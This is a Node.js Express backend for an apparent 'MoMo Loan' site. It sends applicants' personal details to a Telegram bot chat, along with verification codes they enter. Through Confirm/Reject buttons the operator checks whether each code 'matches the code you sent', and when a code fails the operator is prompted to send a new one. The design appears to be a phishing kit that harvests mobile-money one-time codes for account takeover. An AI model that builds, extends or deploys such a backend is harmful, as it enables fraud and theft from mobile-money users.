const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ===== YOUR BOT CREDENTIALS =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;

// Serve your HTML files from the parent folder (momo-website)
app.use(express.static(__dirname));

// In-memory store for confirm/reject decisions
var decisions = {};

// ============================================================
// 1) SUBMIT APPLICATION
// ============================================================
app.post('/api/submit-application', async function (req, res) {
    var d = req.body;

    var message =
        '🔔 *New MoMo Loan Application*\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '\n📋 *LOAN DETAILS*\n' +
        '• Type:      ' + (d.loanType || '-') + '\n' +
        '• Amount:    ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
        '• Term:      ' + (d.term || '-') + ' months\n' +
        '• Purpose:   ' + (d.purpose || '-') + '\n' +
        '\n👤 *APPLICANT*\n' +
        '• Name:      ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
        '• Email:     ' + (d.email || '-') + '\n' +
        '• Phone:     +260 ' + (d.phone || '-') + '\n' +
        '\n💼 *EMPLOYMENT*\n' +
        '• Status:    ' + (d.employment || '-') + '\n' +
        '• Income:    ZMW ' + Number(d.income || 0).toLocaleString() + '\n' +
        '\n🕐 *Submitted:* ' + new Date().toLocaleString() + '\n' +
        '━━━━━━━━━━━━━━━━━━━━━━';

    try {
        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
        var response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        var data = await response.json();
        if (data.ok) {
            console.log('✅ Sent to Telegram:', d.firstName, d.lastName, d.phone);
        } else {
            console.log('❌ Telegram error:', data);
        }
        res.json({ ok: true });
    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 2) VERIFY CODE — with Confirm / Reject buttons
// ============================================================
app.post('/api/verify-code', async function (req, res) {
    var d = req.body;

    var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var message =
        '🔑 *Loan Application Code Received*\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '👤 ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
        '📱 Phone: +260 ' + (d.phone || '-') + '\n' +
        '💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
        '\n🔐 *Code Entered:* `' + (d.code || '-') + '`\n' +
        '\n🆔 Ref: `' + referenceId + '`\n' +
        '\n🕐 ' + new Date().toLocaleString() + '\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '✅ Confirm if this matches the code you sent.';

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ Confirm', callback_data: 'confirm:' + referenceId },
            { text: '❌ Reject',  callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });
        console.log('🔑 Code sent to Telegram with buttons. Ref:', referenceId);
        res.json({ ok: true, referenceId: referenceId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 3) RESEND CODE
// ============================================================
app.post('/api/resend-code', async function (req, res) {
    var d = req.body;

    var message =
        '🔄 *Applicant Requested New Code*\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '📱 Phone: +260 ' + (d.phone || '-') + '\n' +
        '🕐 ' + new Date().toLocaleString() + '\n' +
        '\n⚠️ They didn\'t receive or the previous code didn\'t work.\n' +
        'Please send them a new code.';

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 4) CONFIRM LOAN
// ============================================================
app.post('/api/confirm-loan', async function (req, res) {
    var d = req.body;

    var message =
        '✅ *Loan Confirmed by Applicant*\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '👤 ' + d.firstName + ' ' + d.lastName + '\n' +
        '📱 MoMo Number: +260 ' + d.phone + '\n' +
        '📧 ' + (d.email || '-') + '\n' +
        '\n💰 *Loan:* ZMW ' + Number(d.amount).toLocaleString() + '\n' +
        '📆 *Term:* ' + d.term + ' months\n' +
        '🎯 *Purpose:* ' + (d.purpose || '-') + '\n' +
        '\n🕐 ' + new Date().toLocaleString() + '\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '⚡ *Action:* Review and disburse from your MoMo merchant wallet.';

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 5) NEW: STATUS (frontend polls this)
// ============================================================
app.get('/api/status', function (req, res) {
    var ref = req.query.ref;
    res.json({ status: decisions[ref] || 'pending' });
});

// ============================================================
// 6) NEW: TELEGRAM CALLBACK (button taps come here)
// ============================================================
app.post('/api/telegram-callback', async function (req, res) {
    var cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    var parts = cb.data.split(':');
    var action = parts[0];
    var referenceId = parts[1];

    decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
    console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);

    // Acknowledge the tap
    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: cb.id,
                text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
            })
        });

        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                text: cb.message.text + '\n\n— — —\n' + (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        console.error('Callback reply failed:', err);
    }

    res.sendStatus(200);
});

// ============================================================
// START SERVER — always last
// ============================================================
var PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', function () {
    console.log('🚀 MoMo server running at port ' + PORT);
});